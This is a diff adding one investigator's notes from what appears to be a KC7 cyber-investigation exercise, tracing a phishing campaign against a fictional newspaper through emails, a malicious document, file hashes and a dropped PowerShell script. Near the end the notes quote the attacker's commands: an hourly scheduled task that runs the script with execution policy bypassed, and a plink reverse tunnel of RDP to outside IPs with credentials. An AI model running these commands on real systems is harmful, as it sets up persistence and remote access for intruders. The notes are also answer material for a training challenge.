@@ -1,0 +1,84 @@
+Notes from KC7
+name - Nene Leaks , role 'Editorial Director' , nene_leaks@valdoriantimes.news, ip = 10.10.0.17
+the domain we are asked to find- weprinturstuff.com
+
+where sender has 'weprinturstuff.com' = result 100 senders
+
+name = Lois Lane, ip = 10.10.0.22, email = lois_lane@valdoriantimes.news
+distinct url from Lois Lane = 62
+
+word = 'hire' in records of PasssiveDns = 6 domains contain 'hire'
+
+jobhire.org = ip = 191.7.248.112
+
+Mary Barra, ip= 10.10.0.50, email= mary_barra@valdoriantimes.news
+this user visited 58 websites
+this user tried authenticationevents = count=70
+
+name = Clark Kent, role= NewsPaper Printer, email = clark_kent@valdoriantimes.news
+21 total email Clark has received
+email with print that he received from intern was with subject = URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))
+the name of the doc file that he received= OpEdFinal_to_print.docx
+time = 1/31/2024, 11:11:12 AM = he received to print doc
+
+name = Ronnie McLovin, role = Editorial Intern, detail(clark tells us that he received the email from him)
+hired_date= 1/2/2024, 8:00:00 AM
+email = ronnie_mclovin@valdoriantimes.news
+subject that 
+ip = 10.10.0.19
+hostname = A37A-DESKTOP
+
+name = Sonia Gose, role = Senior Editor, email = sonia_gose@valdoriantimes.news, ip =10.10.0.3, username= sogose, hostname= UL0M-MACHINE
+she received the email phisihing - from = newspaper_jobs@gmail.com
+time = 1/5/2024, 9:42:05 AM
+url that was inlcuded- https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx
+she cliked that link on 1/5/2024, 10:23:17 AM - 
+name of the file = Valdorian_Times_Editorial_Offer_Letter.docx
+first time the file Valdorian_Times_Editorial_Offer_Letter.docx -1/5/2024, 10:24:04 AM
+path = C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx
+sha256= 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f
+
+this led to create - hacktivist_manifesto.ps1,  1/5/2024, 10:24:32 AM
+it is powershell file
+first thing it says to let you know they were here -  lol ur bout 2 get pwnd...;lol ur bout 2 get pwnd
+Green - hackers fav colour
+the purpose of the script is invoke plink
+in process events =this script has 3 process events
+
+to create scheduled task  = schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"
+plink.exe = plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181
+IP ADDRES used for execution plink.exe = 136.130.190.181 	
+username = had0w
+password =thruthW!llS3tUfree
+attacker runned 5 discovery command line after establishing tunel with plink.exe
+
+valdorias_best_recruiter@gmail.com sent 18 email to us
+he sent toRonnie - email at = 1/10/2024, 8:48:16 AM
+domain in the link was = promotionrecruit.org
+subject in that email - [EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles
+
+Ronnie clicked on this link on - 1/10/2024, 8:55:07 AM , file name that was installed on Ronnie machine is - Editorial_J0b_Openings_2024.docx
+this file was created in 1/10/2024, 8:55:17 AM
+
+then on Ronnie machine 'hacktivist_manifesto.ps1' was dropped 1/10/2024, 8:55:51 AM,
+the plink.exe = plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 168.57.191.100
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
